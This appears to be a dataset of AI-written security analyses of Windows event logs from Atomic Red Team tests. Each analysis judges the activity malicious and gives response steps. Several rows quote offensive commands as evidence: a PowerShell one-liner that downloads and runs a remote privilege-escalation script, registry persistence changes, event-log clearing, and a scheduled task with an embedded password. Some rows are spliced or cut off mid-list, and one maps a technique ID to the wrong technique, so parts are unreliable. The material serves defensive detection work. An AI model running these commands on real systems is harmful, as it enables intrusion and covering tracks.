   - Other Sysmon events show normal system operations related to `EdgeUpdate` applications, which align with a system handling software updates.

4. **Network and Time Synchronization:**
   - Security and System logs show time synchronization events (EventID 4616), which can be part of normal operations. However, they occurred alongside other suspicious activities, which could suggest tampering.

5. **Credential or Identity Enumeration:**
   - A `whoami.exe` process was observed, which might indicate an attempt to enumerate the current user's credentials.

### Assessment:

Based on the analysis above, the combination of suspicious PowerShell activity (indicative of persistence mechanisms), event log clearing, and user enumeration strongly suggests malicious intent and possibly active compromise.

### Resolution:

**MALICIOUS**

   - Re-enable logging and ensure log retention policies are enforced.

4. **Patch and Harden:**
   - Check for any unpatched vulnerabilities in the system and apply necessary updates.
   - Review and update endpoint protection configurations.

5. **User Training and Monitoring:**
   - Conduct user awareness training to recognize and report suspicious activities.
   - Enhance monitoring of PowerShell activities and use application whitelisting strategies. 

6. **Incident Response Coordination:**
   - Notify the relevant internal teams and if applicable, external partners such as a CERT team for coordinated response and mitigation."
Suspicious vbs file run from startup Folder,"Upon reviewing the logs provided, I have identified several indicators of potentially malicious activity:

### Indicators of Suspicious or Malicious Activity:

1. **PowerShell Activity:**
   - The PowerShell logs indicate a script execution that involves copying a VBS file named `vbsstartup.vbs` to startup folders both in user space and global space. The script is then executed with `cscript.exe`. This activity corresponds to a persistence mechanism commonly used to ensure code execution on system reboot. Additionally, the use of `AtomicRedTeam` pathways suggests this may have been an atomic test for T1547.001, which corresponds to the Windows Management Instrumentation (WMI) Event Subscription.

2. **Sysmon Events:**
   - Numerous executions of `wevtutil.exe` for clearing event logs (Sysmon/Operational, Application, System, Security, and Windows PowerShell). This action is often a technique used by attackers to cover their tracks.
   - The presence of `whoami` and `hostname` commands execution sequences can be signs of reconnaissance activities post-compromise to gather information about the current user and system state.

3. **Security and System Logs:**
   - The security logs contain Event ID 1102, indicating that the Security log was cleared. This event is a critical sign of log manipulation which can imply malicious intent.
   - Multiple instances of Event ID 104, which pertains to clearing of event logs in the System channel, might indicate an attempt to delete forensic footprints.

4. **Time Synchronization:**
   - There is evidence of an irregular time change on the system (Security Event ID 4616). Time manipulation can be a tactic used to evade detection or create confusion during forensic analysis.

5. **Execution of System Binaries as “Admin_test” User:**
   - System commands such as `cscript.exe` and `wevtutil.exe` running under the `admin_test` user account are suspicious. Anomalous or suspicious accounts executing system-level binaries should be investigated further for misuse or compromise.

### Assessment and Resolution:

Given the combination of persistence mechanisms, log clearing, potential anti-forensic actions, and abnormal user account activity, there are multiple red flags indicating this activity is not benign. 

**Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Isolate the system (`Server002`) from the network to prevent any further spread or data exfiltration.
   - Preserve forensic evidence by capturing a full disk image and memory image of the system.
   
2. **Further Investigation:**
   - Perform a detailed analysis of the VBS script for malicious payloads.
   - Investigate user account activity (`admin_test`) and review access logs for unauthorized access attempts.
   - Cross-reference with any correlated suspicious activity in network logs or related systems.

3. **Remediation:**
   - Change all credentials associated with the compromised accounts.
   - Implement additional monitoring and alerting for similar patterns of behavior across the network.
   - Review and update security policies and training to help prevent future occurrences.

Maintain clear documentation of all findings and actions taken during this investigation to provide a comprehensive incident report."
PowerShell Modify A Scheduled Task,"## Detailed Analysis of the Windows Event Logs

### 1. Suspicious or Anomalous Behavior

#### PowerShell Log

- **Command Execution**: The PowerShell logs indicate a script running that creates and registers a scheduled task (`AtomicTaskModifed`) to execute `cmd.exe` using the `New-ScheduledTaskAction`. It was then modified to execute `Notepad.exe`. This behavior is unusual and suspicious, as it suggests some level of automation or a potential obfuscation attempt to cover malicious actions.

- **Privilege Level**: The task is configured to run with the highest privileges (`BuiltIn\\Administrators`), which can indicate an attempt to gain higher access levels within the system.

#### Sysmon Log

- **Process Creation and Logging Utility**: A series of executions involving `wevtutil.exe`, which is used to manage event logs, are observed:
  - `wevtutil.exe` is used to clear logs, which may be an attempt to hide traces of malicious activity.
  - The execution is linked to `admin_test`, suggesting the activity is associated with a user that has administrative roles.
  
- **Console Processes**: Multiple executions of `conhost.exe` alongside `wevtutil.exe`. While `conhost.exe` is used with console applications, its repetition suggests this process is being utilized with potential hidden intentions possibly in conjunction with log clearance.

#### System Log

- **Log Cleared**: The logs show that multiple event log channels (System and Windows PowerShell) have been cleared by the user `admin_test`. This is a classic indicator of malicious activity, as attackers often clear logs to avoid detection post-exploitation or during persistence establishment.

#### Security Log

- **Time Change**: Events indicate time changes executed by `svchost.exe`, which involves altering system time. Tampering with system time can be used to align timestamps of malicious activities with legitimate activities.
  
- **Privilege Use**: The logs show various privileges being used by `admin_test`, which might be typical for administrative tasks, but in conjunction with other findings, could indicate misuse.

### 2. Indicators of Malicious Activity or Compromise

- **Scheduled Task Creation and Modification**: The PowerShell script is directly associated with creating a scheduled task and indicates an attempt to establish persistence. Tasks that are modified to perform different actions can often signal a hijacked process.

- **Log File Clearing**: The action of clearing log files is a significant indicator of attempts to cover tracks, typically seen in post-exploitation activities.

- **Wevtutil Usage**: The consistent use of `wevtutil.exe` to clear specific logs corroborates the suspicious actions detected.

### Assessment and Recommendations

**Assessment**: The logs contain clear indicators of malicious activity. The use of PowerShell to manipulate scheduled tasks, the clearing of various Windows Event Logs, and the utilization of `wevtutil.exe` by an administrative account suggest deliberate and potentially harmful actions by either the user `admin_test` or an attacker with access to this account.

**Threats/Risks Identified**:
- **Persistence Mechanism**: Creation of scheduled tasks could mean persistence established by an adversary.
- **Account Compromise**: Possible that the `admin_test` account is compromised and being used to elevate privileges and obfuscate activities.
- **Log Manipulation**: The act of clearing logs suggests an effort to prevent detection post-activity.

**Next Steps**:
- **Containment**: Immediately isolate the affected host (Server002) from the network to prevent further malicious actions.
- **Forensic Investigation**: Conduct a memory dump and disk image for deeper forensic analysis.
- **Credential Audit**: Verify recent login activities and consider a password reset for the `admin_test` user and other privileged accounts.
- **Security Enhancements**: Enable enhanced monitoring and alerting for PowerShell script executions and privilege escalation activities.

### Resolution: MALICIOUS

The logs most certainly indicate malicious activity, with a clear pattern of suspicious behavior involving the manipulation of scheduled tasks and log clearing to cover tracks. Immediate response actions are recommended to mitigate potential risks."
Suspicious jse file run from startup Folder,"Upon reviewing the provided logs, several events stand out indicating potentially malicious activity:

1. **Security Log:**
   - **Event ID 1102** indicates that the security event log was cleared by a user named `admin_test`. This action often signifies an attempt to cover tracks after malicious activity, as clearing logs removes evidence of prior events.
   
2. **Sysmon Log:**
   - Repeated use of `wevtutil.exe` with the `cl` (clear) option on multiple logs (Application, System, and Security) further suggests an attempt to hide activity. Event clearing by the same user `admin_test` was consistent.
   - The `powershell.exe` process executed suspicious commands. It copied files named `jsestartup.jse` into startup directories, and used `cscript.exe` to execute these scripts, which is indicative of persistence mechanisms often used by malware.
   - Many Sysmon events (`Event ID 1`) show suspicious process creation, all executing under the same user (`admin_test`) and primarily involving tools often associated with either administrative tasks or malicious behavior (`conhost.exe`, `whoami.exe`).

3. **PowerShell Log:**
   - The PowerShell events indicate execution of scripts typically indicative of tactics, techniques, and procedures (TTPs) used by adversaries. Most notably, the creation and triggering of scripts (`jsestartup.jse`) for persistence purposes raise significant concern.

4. **System Log:**
   - Suggestive of time manipulation, events show system time being changed which can be another technique employed to disrupt log timelines for forensic analysis.

**Assessment:**

The combination of log clearance, suspicious PowerShell activity, and script execution in startup folders strongly suggests malicious intent. The presence of potentially dangerous command lines being executed by a high-privilege account (`admin_test`) further solidifies this assessment.

**Conclusion:**

The activities observed in the logs are consistent with known malicious behaviors attempting to establish persistence, cover tracks, and potentially set the stage for further exploitation. Given the evidence of log tampering, script deployment, and command execution, I conclude that the behavior within these logs can be classified as:

- **MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Incident Response:**
   - Isolate the affected system from the network to prevent further access or damage.
   - Preserve volatile data for further analysis, including in-memory forensics.

Winlogon Shell Key Persistence - PowerShell,"### Analysis of Logs:

#### Suspicious and Anomalous Behavior:
1. **Log Clearing Operations**:
   - Multiple instances of the `wevtutil.exe` being used to clear logs (Application, System, Windows PowerShell) by the user `SERVER002\admin_test`. This activity happened in quick succession indicating potential log tampering or covering of tracks.
   - Event IDs in the Security and System logs confirm log clearing actions with the subject user being `admin_test`.

2. **PowerShell Command**:
   - A PowerShell command was executed by `powershell.exe` to alter the registry key HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell to include `cmd.exe`. This is a classic tactic used by attackers to persist using a registry-based startup of unauthorized shell commands.

3. **High Integrity Level Process Executions**:
   - Many processes, including `wevtutil.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `powershell.exe`, were executed with high integrity levels. While these processes are typically benign, their combined usage within the same timeframe, especially with unauthorized registry modifications, is alarming.
   - Use of `wevtutil.exe cl` commands is particularly notorious as a technique for hindering forensic analysis post-compromise.

#### Indicators of Malicious Activity:
- **Event Log Clearing**: Admin user `admin_test` clearing event logs is a significant red flag. Attackers often clear logs to erase their footprints after malicious activities.
- **Registry Modification for Persistence**: The modification of the `Winlogon` shell key to include `cmd.exe` indicates a potential attempt to ensure persistence through registry keys.

### Assessment:
The combination of log clearing, unauthorized registry modifications, and the specific execution context of commands strongly suggest an attempt to compromise the system or maintain persistence covertly. Such behavior aligns with known tactics associated with system compromise or staging for a more extensive attack.

### Resolution:
- **MALICIOUS**: The observed behaviors are consistent with known attack patterns and suggest deliberate efforts to obfuscate activities and establish persistence in a potentially unauthorized manner.

### Guidance on How to Proceed:
1. **Immediate Containment**:
   - Isolate `Server002` from the network to prevent potential lateral movement or data exfiltration.

2. **Investigation and Eradication**:
   - Conduct a thorough forensic investigation to understand the breadth of the compromise. Investigate any other linked systems for similar activities.
   - Review user accounts and privileges, particularly focusing on the user `admin_test`, and consider resetting credentials.
   - Validate system integrity and check for unauthorized changes beyond the identified registry modifications.

3. **Recovery**:
   - Restore affected systems from clean backups.
   - Ensure all security patches and updates are applied to prevent exploitation of known vulnerabilities.

4. **Enhancements and Monitoring**:
   - Enhance monitoring for event IDs and suspicious behaviors highlighted in this analysis.
   - Implement stricter access controls and monitoring on systems housing critical data.

By addressing these key areas, you can work to mitigate any immediate threats and strengthen the host’s security posture against future intrusions."
LockBit Black - Modify Group policy settings -cmd,"Upon reviewing the Windows event logs, several entries indicate potentially malicious activity:

1. **Event Log Clearing:**
   - The logs show the use of the `wevtutil.exe` command-line utility to clear various event logs, including the System, Security, and Windows PowerShell logs. This action is usually a significant red flag, as it can indicate an attempt to cover tracks after unauthorized or malicious activity.
   - Security log EventID 1102 indicates that the security log was cleared, which is a common tactic employed by attackers to erase evidence.
   
2. **Unusual Registry Modifications:**
   - There is a `cmd.exe` process executing command lines that modify various Windows registry keys under `HKLM\SOFTWARE\Policies\Microsoft\Windows\System`:
     - The modifications include setting `GroupPolicyRefreshTimeDC`, `GroupPolicyRefreshTimeOffsetDC`, `GroupPolicyRefreshTime`, `GroupPolicyRefreshTimeOffset`, `EnableSmartScreen`, and `ShellSmartScreenLevel`. 
   - These actions are suspicious, as they're altering system policies related to group policy refresh and disabling the Windows SmartScreen feature, likely in an attempt to reduce the system's security posture and decrease the detection of further malicious actions.

3. **Execution of Common Utilities:**
   - Use of `whoami.exe` and `hostname.exe` within a short time frame, possibly to gather information about the logged-in user and the system details.
   - These utilities themselves are not inherently malicious but are often used by attackers in the early stages of compromise to orient themselves to the environment they have gained access to.

4. **Microsoft Edge Update Activity (Potentially Benign):**
   - There are numerous instances of `MicrosoftEdgeUpdate.exe` related processes indicating updates or installations. While this activity appears routine for Edge updates, its timing alongside the malicious behavior elsewhere raises suspicion. Context on whether these updates were authorized could be relevant.

**Assessment:**
The logs provide strong indicators of potentially malicious activity, particularly through the deliberate clearing of event logs and the modification of critical registry entries. The behavior suggests an attempt to obfuscate actions and reduce system defenses. While some activities like application updates could be benign, their coincidence with the suspicious behavior warrants a cautious approach.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

Domain Password Policy Check: Short Password,"### Detailed Analysis of the Logs:

#### Suspicious or Anomalous Behavior:
1. **PowerShell Activity**:
   - The logs indicate a PowerShell script executed on `Server002` that attempts to manage user credentials. The script checks for a pre-stored credential file associated with the user and tries to update the password. If the new password ""Uplow-1"" matches the stored password, it prompts the user to use a different password. This kind of operation involving credential file management, especially storing and updating passwords through scripts, is generally sensitive and potentially risky if not properly authorized and monitored, as it involves direct manipulation of user credentials.

2. **Cleaning of Event Logs**:
   - Multiple entries in both the **Sysmon** and **Security logs** show evidence of the command `wevtutil.exe cl` being executed, which clears event logs (Application, System, Security, and Windows PowerShell logs). This action is typically used to cover tracks on a compromised system, indicating potentially malicious intent.

3. **Use of `wevtutil.exe` and Process Anatomy**:
   - The repeated use of `wevtutil.exe` is visible in the **Sysmon logs** which shows commands executed to clear the event logs. Every event log (Application, System, Security, and PowerShell) being cleared is suspicious, especially given that `admin_test` is the user performing these actions, indicating potential unauthorized activities under the admin account.

#### Indicators of Malicious Activity:
- **Clearing Security Logs**:
  - The clearing of security logs is a strong indication of malicious activities. It suggests an attempt to obfuscate actions performed on the system, especially since logs record user actions, breaches, and changes to the system that might help in identifying unauthorized accesses or other issues.
  
- **Command Line Execution with Elevated Rights**:
  - The execution of PowerShell scripts and other command-line utilities (`wevtutil.exe`) under high integrity level through a potentially compromised admin account further raises suspicion.

### Assessment:

The combination of activities reported in these logs, especially around clearing event logs and the management of PowerShell scripts dealing with user credentials, strongly indicates suspicious behavior. While there is no concrete proof of an external attack, the behavior of `admin_test` clearing logs covertly and running scripts that handle sensitive information like user passwords underlines potential insider threats or unauthorized access scenarios.

### Threats or Risks Identified:
- Potential unauthorized alteration and management of user credentials.
- Likelihood of malicious intent to hide tracks by clearing event logs.
- Insider threat or compromised user account trying to exploit system resources or access.

### Guidance on How to Proceed:
- **Immediate Audit of Credentials**: Verify the integrity and legitimacy of the `admin_test` account’s activities. This includes real-time monitoring of actions and reviewing user activities through additional logging systems independently.
- **Enhanced Monitoring**: Implement additional layers of logging and monitoring, particularly to detect the use of sensitive scripts like the credential manipulation script observed.
- **System Security Review**: Conduct a thorough review of system security policies and ensure two-factor authentication is enabled for high-privilege accounts.
- **Reverse Engineering**: Review and analyze the PowerShell script for any hidden or undocumented functionalities that may grant additional access or perform unwanted operations.
- **Incident Response Protocol**: Follow through with incident response playbook, including isolation of the machine, checking for unauthorized access across the network, and performing a root cause analysis.

**Resolution**: **MALICIOUS**  
Given the evident sequence of clearing event logs and sensitive handling of credentials without clear documentation or integration into normal IT operations, the situation indicates a high likelihood of attempted or active compromise. Immediate actions to safeguard systems and perform forensic analysis are recommended."
Allowing custom application to execute during new RDP logon session,"Upon reviewing the provided logs, there are several points of interest that suggest suspicious and potentially malicious activities:

1. **Event Log Clearing (Event ID 1102 and 104)**:
   - There are multiple instances where event logs were cleared. This activity is often associated with malicious intent to hide tracks. The user `admin_test` triggered these log clearings, specifically for the security, application, and system logs, which included Sysmon logs.

2. **Suspicious Command Execution via Sysmon Logs**:
   - There are records of command line executions that are concerning. One specific instance involves a command using `cmd.exe` to execute a registry change that modifies startup programs to include `calc`. This tactic is commonly used by attackers to ensure persistence after a system reboot.
   - The execution of `powershell.exe` with the command `-ExecutionPolicy Restricted -Command $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\\inf\\*.inf'); ...` indicates the execution of a potentially malicious PowerShell script which could be scanning or modifying system files.

3. **Multiple Privileged Logons and Privileges Assigned**:
   - The logs show multiple occurrences of Event ID 4672, which indicates users being granted special privileges like `SeDebugPrivilege`, which can be used to manipulate or impersonate system-level processes.

4. **Service Host Activity**:
   - The activity of `wevtutil.exe`, which is used to clear event logs, executed by the `admin_test` account, is a red flag, especially because of its close timestamps to the clearing of logs.

5. **Taskhostw and CompatTelRunner Execution**:
   - Regular and rapid execution of Windows binaries like `taskhostw.exe` and `CompatTelRunner.exe` is recorded. These are system processes, but their rapid execution can be leveraged in Living-off-the-Land Binaries (LoLBins) attacks.

Based on the analysis of these logs, which show log clearing, suspicious persistence mechanisms, potential privilege escalation, and frequent use of administrative tools for potentially unauthorized purposes, the evidence leans strongly towards malicious activities.

**Final Resolution: MALICIOUS**

**Guidance on how to proceed**:
- Immediately isolate the system `Server002` from the network to prevent further potential malicious activity.
- Conduct a forensic analysis to determine the root cause and the scope of the compromise.
- Review and change all credentials and access associated with the `admin_test` account and any potentially compromised accounts.
- Regularly monitor similar systems for similar signs of compromise.
- Strengthen detection and alert systems to flag high-risk activities like log clearing and registry modifications."
WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique,"Upon reviewing the log entries from the various logs provided, several indicators of potential malicious activity have surfaced:

### 1. **Log File Clearing Events:**
   - **System Log EventIDs** 104 (System) and **Security Log EventID** 1102 indicate that the log files have been cleared by a user ""admin_test"". Clearing logs can be a common technique used by attackers to cover their tracks after malicious activity.

### 2. **Suspicious PowerShell Activity:**
   - The **PowerShell Log** shows EventID 600 with the execution of PowerShell using a command that downloads and executes a script from an external URL:
     - `""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')}`
   - The use of `iex` (Invoke-Expression) with a web client to download and immediately execute a script is highly suspicious and typical of malicious activity such as executing malware or scripts directly from a remote source.

### 3. **Wevtutil Execution:**
   - The **Sysmon Log** shows multiple instances of `wevtutil.exe` being executed with the command to clear logs (`cl`) for different event channels (e.g., `System`, `Security`, `Windows PowerShell`).
   - The command line arguments used indicate that this process was responsible for clearing logs, aligning with the log-clearing events mentioned above.

### 4. **Time Change Event:**
   - There are multiple **Security Log EventIDs** 4616 indicating time changes made by the `svchost.exe` process. Time adjustments on a system could be a sign of anti-forensic measures.

### Assessment of the Situation:
The behavioral patterns observed through these logs, particularly the log clearing and suspicious PowerShell execution, strongly indicate malicious activity. The intent appears to be obfuscation and direct execution of potentially harmful scripts, combined with attempts to erase evidence by clearing logs.

### Recommended Actions:
1. **Immediate Isolation:** Isolate the affected machine from the network to prevent further potential spread or data exfiltration.
2. **Detailed Forensic Investigation:** Conduct a detailed forensic analysis of the machine to identify any changes made, especially in terms of data access, file system alterations, and additional payloads or malware that might have been installed.
3. **Review Admin Account Usage:** Investigate the usage of the ""admin_test"" account and verify the legitimacy of the user actions associated with this account. Change the credentials if any unauthorized activities are confirmed.
4. **Network Traffic Analysis:** Review network traffic logs around the time these events occurred to identify any unusual outbound connections, specifically to external IPs associated with the downloaded script.
5. **Patch and Harden Security Posture:** Ensure all systems are patched and security measures are enforced to prevent a similar occurrence in the future. This includes disabling the use of potentially risky scripting technologies unless specifically necessary and closely monitored.

### Resolution:
- **MALICIOUS** - The logs contain sufficient evidence to classify the activities as malicious. The immediate steps should involve containment and deeper investigation to fully understand the impact and scope of the intrusion."
HKLM - Add atomic_test key to launch executable as part of user setup,"Upon reviewing the provided Windows event logs, the following observations and potential indicators of suspicious behavior have been identified:

### Observations:

1. **PowerShell Activity**:
    - Multiple PowerShell commands appear to have been executed on `Server002`. These include creating a registry key under `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components` with the name `atomic_test`, setting properties, and configuring `calc.exe` as the `StubPath`. This is an unusual registry modification for a legitimate scenario, and could potentially be used to persistently execute unwanted scripts or programs on startup.

2. **Registry and System Modifications**:
    - The PowerShell activity is indicative of potential malicious intent, as it modifies registry entries to possibly execute `calc.exe` on startup. This behavior could be associated with a test or benign purpose in some environments. However, without prior knowledge or documentation, it raises concern.

3. **Logfile Clearing**:
    - There is evidence of the security log being cleared (`EventID 1102`), indicating that someone with administrator privileges may be attempting to hide their tracks. This is common behavior for malicious actors who want to erase forensic evidence.

4. **Time Alterations**:
    - There are multiple events indicating changes in system time (`EventID 4616`), which can be suspicious if there's no legitimate reason for the system clock to be adjusted. Altering system time can be used to manipulate logs or bypass time-based security measures.

5. **Sysmon Activity**:
    - Sysmon logs indicate multiple uses of the `wevtutil.exe` command to clear event logs, performed by the user `SERVER002\admin_test`, suggesting efforts to disrupt forensic investigations. Additionally, there is recurring activity related to Microsoft Edge Update, but no indications of immediate anomalous behavior with them.

### Assessment:

- The combination of unauthorized PowerShell activity, registry modifications, erasure of logs, and time change manipulations are concerning. These actions typically align with attempts to compromise a system, maintain persistence, and avoid detection by covering tracks.
- There is no conclusive indication of a benign explanation or legitimate administrative tasks being conducted that justify these actions within the logs provided. 

### Resolution:

- **MALICIOUS**: The activities logged indicate deliberate modification of system settings and logs, consistent with attempts to obscure unauthorized activities and obtain persistent malicious access to the system.
  
### Recommendations for Action:

1. **Immediate Investigation**: Conduct a deep dive into the `admin_test` account activities to determine if it has been compromised or if the actions are unauthorized.
2. **Incident Response**: Utilize snapshot backups to rollback the system to a known clean state. Isolate the system to prevent further exploitation.
3. **Forensic Analysis**: Preserve forensic evidence by capturing memory and disk images of the affected system.
4. **Review and Harden Security Policies**: Implement stricter audit policies to better monitor critical changes, and use Application Control Policies to prevent unauthorized execution.
5. **Awareness and Prevention**: Train staff to recognize and report potential phishing attempts or suspicious activities that could lead to unauthorized access.

These actions should be executed with caution, ensuring that any critical data is appropriately backed up and protected."
Read-Write-Execute process Injection,"Based on the provided Windows event logs analysis, we can ascertain the following:

1. **Presence of Suspicious PowerShell Execution**:  
   - A PowerShell script is executed from `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1055\bin\x64\`. This path and the specific script names are indicative of known offensive security tools used for testing and demonstrating exploits, such as process injection (T1055). These scripts often simulate or perform actions that adversaries would use to exploit or test system vulnerabilities, albeit in a controlled manner.

2. **Event Logging Tampering**:  
   - The logs indicate the clearing of event logs (Event ID 104 for System, Event ID 1102 for Security), which is a significant red flag. This action impairs security visibility and is commonly associated with efforts to hide malicious actions on a system.

3. **High Integrity Level Execution**:  
   - Many of the processes, particularly those related to `wevtutil.exe` and suspicious PowerShell scripts, are running at a high integrity level. This could suggest the processes have higher privileges, potentially enabling them to perform actions that should be restricted or closely monitored.

4. **Usage of Valid System Binaries in Potentially Malicious Ways (Living off the Land)**:  
   - Usage of native administrative utilities like `wevtutil.exe` for clearing logs suggests “living off the land” tactics. These utilities are often abused by attackers because they typically do not raise alarms since they are legitimate parts of the OS.

5. **No Evidence of External Communication or Lateral Movement**:  
   - While actions on the machine are suspicious and potentially malicious, there are no log entries directly indicating external data exfiltration or lateral movement within the network.

### Assessment and Recommendations:

- **Resolution: MALICIOUS**  
  The combination of using a test framework known for executing attack simulations, clearing logs, and the manner in which legitimate tools are used together indicate the presence of malicious activity. Additionally, if the scripts were not authorized under strict oversight for security testing, this usage could be indistinguishable from a real attack scenario.

- **Immediate Actions**:
  - **Isolate the Host**: Immediately isolate the affected system from the network to prevent any potential spread or data exfiltration.
  - **Preserve All Evidence**: Secure and preserve all forensic evidence including memory dumps, further logs, and network traffic.
  - **Conduct a Detailed Forensic Analysis**: Further investigate what actions were performed by the PowerShell scripts and any potential vulnerabilities they exploited.
  - **Review System Access**: Conduct a review of user accounts and permissions, specifically the account executing these commands.
  - **Coordinate with Legal/Compliance Teams**: Evaluate any regulations that mandate breach disclosure or specific response actions.

- **Long-Term Recommendations**:
  - **Enhance Monitoring**: Implement more robust monitoring of PowerShell and other system utilities, possibly using AMSI or similar solutions.
  - **User Education and Policy Enforcement**: Train users on security policies regarding the use of tools that could potentially be used for malicious purposes and enforce strict controls over who can perform administrative actions.
  - **Regular Audit of Security Tools**: Ensure that all security and offensive testing tools are tracked and usage is documented within your organization’s security governance framework."

### Suspicious or Anomalous Behavior:
1. **Log Clearing Activity:**
   - Multiple logs were cleared, evidenced by `EventID: 104` in the System log and `EventID: 1102` in the Security log. The logs were cleared on several channels, including System, Windows PowerShell, and Security.
   - These actions were performed by the user `admin_test`, which might suggest an attempt to conceal activities or actions taken on the system.

2. **Use of wevtutil.exe:**
   - The utility `wevtutil.exe` (EventID: 1 in the Sysmon logs) was used to clear specific logs (`cl` command), which matches the manual log-clearing events.
   - The processes were executed under the context of the `admin_test` user, with high integrity, suggesting an elevated privilege use, which is common in malicious activities aiming to alter or delete logs.

3. **Scheduled Task Creation:**
   - The use of `schtasks.exe` to create a scheduled task (with EventID: 1 in the Sysmon logs) is notable. The task creation command was run via `cmd.exe`, specifying `/RU DOMAIN\user /RP At0micStrong`, which might be an attempt to persist a command or payload execution in the system.
   - The creation of a scheduled task in such a manner is commonly associated with persistence mechanisms in cyber attacks.

### Potential Malicious Activity:
- **Clearing Logs Intentional Obfuscation:**
  - The intentional clearing of logs by an administrative user in conjunction with the suspicious execution of `wevtutil.exe` and `schtasks.exe` strongly suggests activities geared towards evasion and potential malicious intent.
  
- **Scheduled Task with Credential Specification:**
  - The scheduled task includes potentially suspicious credentials (`DOMAIN\user /RP At0micStrong`), which could represent an unauthorized use of credentials or an attempt to execute tasks with specific privileges that may not have been intended by legitimate administrators.

### Assessment:
- **Threats/Risks Identified:**
  - The actions identified, especially the clearing of logs and creating of scheduled tasks with potentially unauthorized credentials, suggest a compromise with a likely focus on maintaining foothold through persistence and covering tracks through log manipulation.
  
- **Guidance on How to Proceed:**
  - Immediately review permissions and current activity related to the `admin_test` account.
  - Check for other indicators of compromise (IoCs) across the network, especially those connected to this system.
  - Conduct a comprehensive review of scheduled tasks and their legitimacy.
  - Consider isolating the system from critical network resources until a full assessment and system health check can be completed.

1. **Wevtutil Process Execution**:
    - **Sysmon logs** indicate multiple instances of the `wevtutil.exe` command being executed. While this utility is used for managing event logs, its involvement in rapid execution (clearing multiple logs) can indicate an attempt to cover tracks by a threat actor.
    - The command line executions involved commands such as `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, and `cl Security`, representing clearing of logs, which is highly suspicious when performed in quick succession.

2. **Log Clear Events**:
    - **Security event ID 1102** marks the clearing of the audit log by the user `admin_test`, a significant red flag, as it suggests attempts to delete forensic evidence of potentially malicious activity.
    - **System log event ID 104** also reflects the clearing of logs across various channels by the same user, corroborating intent to avoid detection.

3. **Time Manipulation**:
    - **Security event ID 4616** shows that the system time was changed. Time manipulation is a common tactic used upon gaining elevated privileges to alter logs or avoid time-based detection mechanisms.

4. **Execution of Potential Penetration Testing Tools**:
    - Instances of `MicrosoftEdgeUpdate.exe` and `PowerShell.exe` running command lines indicative of manual intervention or possible use of testing frameworks like Atomic Red Team, specifically:
      - `powershell.exe & {C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1055.004\bin\x64\EarlyBird.exe -program \""C:\Windows\System32\werfault.exe\"" -debug}`
      - These activities, typically aligned with penetration testing or malicious cybersecurity activities like injection tactics, are suspicious if done on production hosts without due authorizations.

5. **PowerShell Logs**:
    - **PowerShell logs** further confirm the execution of suspicious scripts, indicating the possible execution of test scripts, authorized or unauthorized, on the host.

Based on the analysis of these logs, the activities observed do exhibit characteristics of malicious behavior with potential intentions to obfuscate logs, leverage existing system tools for malicious purposes, and execute known security testing tools possibly without consent from or awareness of IT/security teams.

### Conclusion

**Resolution**: MALICIOUS

Given the combination of log clearing, anomaly processes executed by `admin_test`, and atypical usage of system utilities, these occurrences strongly suggest potential compromise or actively ongoing penetration testing without proper notification/approval. Immediate action is recommended to:

- Isolate the affected system to prevent further compromise.
- Conduct a thorough analysis of user `admin_test` activities and access levels.
- Review permissions and execution of scheduled tasks or additional scripting tools on the network.
- Engage incident response team to unravel and mitigate further risks.

Ensure communication with relevant stakeholders and reinforce monitoring across related endpoints to pre-empt similar activities."
Modify HKLM:\System\CurrentControlSet\Control\Lsa Security Support Provider configuration in registry,"**Analysis:**

1. **PowerShell Activity:**
   - The PowerShell logs reveal an activity involving a script that modifies the registry key `HKLM:\System\CurrentControlSet\Control\Lsa`, replacing the 'Security Packages' value with ""AtomicTest.dll"". This is highly suspicious, as it modifies security settings and potentially injects a DLL, which could allow unauthorized code execution or privilege escalation.
   
2. **Log Clearing:**
   - The System log entries indicate that the event logs for Application, System, and Windows PowerShell were cleared around the same timestamp by the user `admin_test`. This is an indicator of potential malicious activity as attackers often clear logs to cover their tracks.
   
3. **Sysmon Logs:**
   - The Sysmon logs show multiple invocations of `wevtutil.exe` with the command to clear logs, which correlates with the clearing of log entries. The user executing these commands is `SERVER002\admin_test`, further indicating attempts to hide activity by quickly deleting logs.
   
4. **Service Start/Stop:**
   - There are multiple Sysmon entries indicating the execution of `MicrosoftEdgeUpdate.exe` processes, which might seem benign as they relate to Microsoft Edge updates. However, the surrounding context (timing and the manipulation of logs and security settings) raises the level of severity as this could be part of exploiting legitimate services for malicious purposes.

**Assessment:**

Based on the registry modification through PowerShell, clearing of event logs, and the context of these activities occurring in a tight sequence, these logs strongly indicate unauthorized and potentially malicious activity. The modification of security packages in the registry suggests an attempt to introduce or execute potentially harmful code. The clearing of logs points to an intention to obscure these actions from audit trails.

**Resolution:**

- **MALICIOUS:** The collected evidence of the PowerShell script altering critical security registry settings, combined with the event log clearing activities (likely to cover tracks), indicate a malicious intrusion. Immediate response actions such as isolating the affected machine, conducting a thorough forensic analysis, and reviewing access privileges and security policies are recommended.
"
Remote Process Injection with Go using NtQueueApcThreadEx WinAPI,"Upon examining the provided logs, several indicators of potentially malicious activity are observed. Below is the detailed analysis:

### Suspicious Activities Identified:

1. **Event Log Clearing**:
   - **Security Event ID 1102** indicates clearing of security logs by user `admin_test`. This activity is typically malicious when no valid justification exists as it implies an attempt to cover tracks.

2. **Sysmon Activities**:
   - Multiple executions of `wevtutil.exe`, which is used to clear event logs, were recorded. Processes such as `whoami.exe` and `wevtutil.exe` were executed under the `admin_test` account from `C:\\Windows\\System32\\`.
   - The command executed by `wevtutil.exe` specifically to clear logs reinforces the log tampering suspicion: `""C:\\Windows\\system32\\wevtutil.exe"" cl <Log Name>`.

3. **Execution of Potentially Malicious Commands**:
